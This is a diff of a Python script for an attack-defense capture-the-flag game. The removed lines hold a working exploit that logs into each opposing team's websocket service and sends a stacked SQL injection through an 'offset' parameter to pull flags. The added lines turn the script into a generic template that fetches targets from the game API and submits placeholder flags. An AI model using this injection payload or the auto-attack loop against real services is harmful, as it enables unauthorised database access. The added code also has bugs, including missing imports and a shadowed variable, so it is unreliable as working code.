@@ -1,14 +1,12 @@
 # pip install websocket-client
-import websocket
 from pwn import *
 import threading
-import re
-from time import sleep
 import Queue
+from ictf import Team
 
-
+_service = "service_name"
 _author = "ocean"
-_submitter_url = 'http://localhost:8080/submit'
+_submitter_url = 'http://***REMOVED***/submit'
 
 global flags
 flags = []
@@ -19,99 +17,51 @@ submitted_flags = []
 
 q = Queue.Queue()
 
+flg_re = r"FLG\w{13}"
+
 
 def attack(target):
-    while(1):
-        ws = websocket.WebSocket()
-        try:
-            ws.connect("ws://mol.%s/websocket" % target, timeout=0.2)
-            break
-        except:
-            # print "FAILED for %s" % target
-            # backoff
-            sleep(10)
+    """ your main attack routing goes here """
 
-    def create_cmd(action, params):
-        cmd = dumps({
-            "action": action,
-            "params": params
-        })
-        return cmd
+    # here attack the service and get the flags
+    print target
 
-    def auth(username, password):
-        users = None
-        action = "auth"
-        params = {"username": username,
-                  "password": password}
-        cmd = create_cmd(action, params)
-        ws.send(cmd)
-        result = ws.recv()
-        if "Welcome" in result:
-            users = ws.recv()
+    flags = [
+        "FLG1234567890123",
+        "FLGABCDEFGHI0123"]
 
-        return {"result": result,
-                "users": users}
-
-    def register(username, password):
-        params = {"username": username,
-                  "password": password}
-        cmd = create_cmd("register", params)
-        ws.send(cmd)
-        result = ws.recv()
-        return result
-
-    def show_crimes(offset):
-        action = "show_crimes"
-        params = {"offset": offset}
-
-        cmd = create_cmd(action, params)
-        ws.send(cmd)
-        result = ws.recv()
-        return result
-
-    register("ocean", "ocean")
-
-    auth("ocean", "ocean")
-
-    offset = "100000234213551;\
- SELECT crimeid, description, article, city, country, crimedate, true\
- FROM crimes WHERE description LIKE '%%=' LIMIT 8 OFFSET \
- (SELECT COUNT(*)FROM crimes WHERE description LIKE '%%=')-8 -- "
-
-    result = show_crimes(offset)
-
-    ws.close()
-    matches = re.findall("\w{31}=", result)
-
-    submit_flags(matches, target)
-
-    # service not patched, again!!! :)
-    if matches:
-        threading.Thread(target=attack, args=(target,))
-    else:
-        pass
-        # print "no matches for %s, no more spawning" % target
+    submit_flags(flags, target)
+    return
 
 
-def submit_flags(flags, team):
+def submit_flags(flags, target):
     requests.post(
         _submitter_url,
         data={
             "service": _service,
-            "team": team,
+            "team": target['team_name'],
             "flags": flags,
             "name": _author})
 
-teams = []
-with open("tlist", "r") as ff:
-    for i in ff.readlines():
-        i = i.rstrip('\n')
-        teams.append(i)
 
-# spawn one thread for every team (not good!) :/
-for t in teams:
-    # attacking
-    print "attacking", t
-    th = threading.Thread(None, attack, args=(t,))
-    threads.append(th)
-    th.start()
+if __name__ == "__main__":
+
+    current_tick = 0
+    t = Team("***REMOVED***", "***REMOVED***")
+
+    while(1):
+
+        t_info = t.get_tick_info()
+
+        # sleep until the next round
+        sleep(t_info['approximate_seconds_left'])
+
+        targets = t.get_targets(_service)
+
+        # ugly, spawn one thread for each target!
+        for t in targets:
+            # attack phase
+            print "attacking", t
+            th = threading.Thread(None, attack, args=(t,))
+            threads.append(th)
+            th.start()
